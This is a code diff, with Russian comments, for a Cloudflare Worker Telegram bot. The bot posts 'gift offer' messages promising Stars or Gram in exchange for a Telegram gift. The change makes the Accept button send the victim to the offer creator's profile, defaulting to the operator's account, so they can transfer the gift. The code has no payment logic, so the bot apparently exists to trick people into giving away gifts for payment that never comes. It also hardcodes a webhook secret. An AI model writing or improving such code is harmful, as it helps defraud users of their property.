@@ -1,8 +1,7 @@
 const ADMIN_ID = 5151757168; 
-
 const WEBHOOK_SECRET = "GarisOffer9231998"; 
 
-const ALLOWED_IDS = [5151757168, 9021098137, 1290278554, 883619484, 7903610791, 1976216049];
+const ALLOWED_IDS = [5151757168, 9021098137, 1290278554, 883619484, 7903610791];
 const ALLOWED_USERNAMES = ["nogannopervi"];
 
 export default {
@@ -10,7 +9,6 @@ export default {
     const BOT_TOKEN = env.BOT_TOKEN; 
 
     if (!BOT_TOKEN) {
-      console.error("КРИТИЧЕСКАЯ ОШИБКА: Переменная BOT_TOKEN не задана в Cloudflare!");
       return new Response("Bot token is not configured", { status: 500 });
     }
 
@@ -80,6 +78,12 @@ export default {
         if (iq.from.last_name) senderName += " " + iq.from.last_name;
         if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";
 
+        // БЕРЕМ ДАННЫЕ ПРОДАВЦА (того, кто создал офер)
+        const sellerUsername = iq.from.username || "";
+        const sellerId = iq.from.id;
+        // Зашиваем ID продавца в кнопку, чтобы знать, кому передавать
+        const sellerRef = sellerUsername ? sellerUsername : sellerId;
+
         const text = `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ${currencyDisplay} за этот подарок.\n\n${giftLink}\n\n⏳ Предложение действительно 5 ч. 59 мин.`;
 
         const results = [{
@@ -90,7 +94,8 @@ export default {
           input_message_content: { message_text: text, parse_mode: "HTML" },
           reply_markup: {
             inline_keyboard: [
-              [{ text: "✅ Принять", callback_data: `acc|${amount}|${currencyType}` }],
+              // Передаем данные продавца в кнопку
+              [{ text: "✅ Принять", callback_data: `acc|${amount}|${currencyType}|${sellerRef}` }],
               [{ text: "❌ Отклонить", callback_data: `dec|${amount}|${currencyType}` }]
             ]
           }
@@ -109,24 +114,28 @@ export default {
           const action = dataParts[0];
           const amount = dataParts[1] || "0";
           const currencyType = dataParts[2] || "stars";
+          const sellerRef = dataParts[3] || ""; // Достаем данные продавца
           const displayCurrency = currencyType === "gram" ? "💎 Gram" : "⭐ Stars";
 
+          // Покупатель (тот, кто нажал кнопку)
           const buyer = cq.from;
           let buyerName = buyer.first_name || "";
           if (buyer.last_name) buyerName += " " + buyer.last_name;
-          if (!buyerName) buyerName = buyer.username ? "@" + buyer.username : "Пользователь";
 
-          // УМНАЯ ЛОГИКА ДЛЯ КНОПКИ И ТЕКСТА
-          let buyerLink = "https://t.me/gwrex"; // Резервная ссылка на тебя
-          let buyerInfoText = `<b>${buyerName}</b>`; // Просто имя
+          // Ссылка на ПРОДАВЦА (того, кто создал офер)
+          let sellerLink = "https://t.me/gwrex"; // По умолчанию на тебя
+          let sellerDisplay = "@gwrex";
 
-          if (buyer.username) {
-            // Если есть ник - ссылка на него, в тексте пишем ник
-            buyerLink = "https://t.me/" + buyer.username;
-            buyerInfoText = `<b>${buyerName}</b> (@${buyer.username})`;
-          } else {
-            // Если ника нет - в тексте пишем ID, чтобы ты мог найти его вручную
-            buyerInfoText = `<b>${buyerName}</b> (ID: <code>${buyer.id}</code>)`;
+          if (sellerRef) {
+              if (isNaN(sellerRef)) {
+                  // Если это ник
+                  sellerLink = "https://t.me/" + sellerRef;
+                  sellerDisplay = "@" + sellerRef;
+              } else {
+                  // Если это ID
+                  sellerLink = `tg://user?id=${sellerRef}`;
+                  sellerDisplay = "профиль продавца";
+              }
           }
 
           let newText = "";
@@ -135,14 +144,14 @@ export default {
           if (action === "acc") {
             await callApi("answerCallbackQuery", { 
               callback_query_id: cq.id, 
-              text: `Предложение успешно принято ✅\n\nПередайте подарок, чтобы ${amount} ${displayCurrency} пришли`, 
+              text: `Оффер принят ✅\n\nНажмите "Передать подарок", чтобы перейти к продавцу`, 
               show_alert: true 
             }, BOT_TOKEN);
             
-            // Используем умный текст
-            newText = `✅ <b>Подарок продан!</b>\n\nПередайте его покупателю ${buyerInfoText}, чтобы получить ${amount} ${displayCurrency}.`;
+            newText = `✅ <b>Оффер принят!</b>\n\nПокупатель: <b>${buyerName}</b>\n\nЧтобы получить ${amount} ${displayCurrency}, передайте подарок продавцу.`;
             newMarkup = { 
-              inline_keyboard: [[{ text: "🎁 Передать подарок", url: buyerLink }]] 
+              // Кнопка ведет на профиль ПРОДАВЦА
+              inline_keyboard: [[{ text: "🎁 Передать подарок", url: sellerLink }]] 
             };
           } else {
             await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
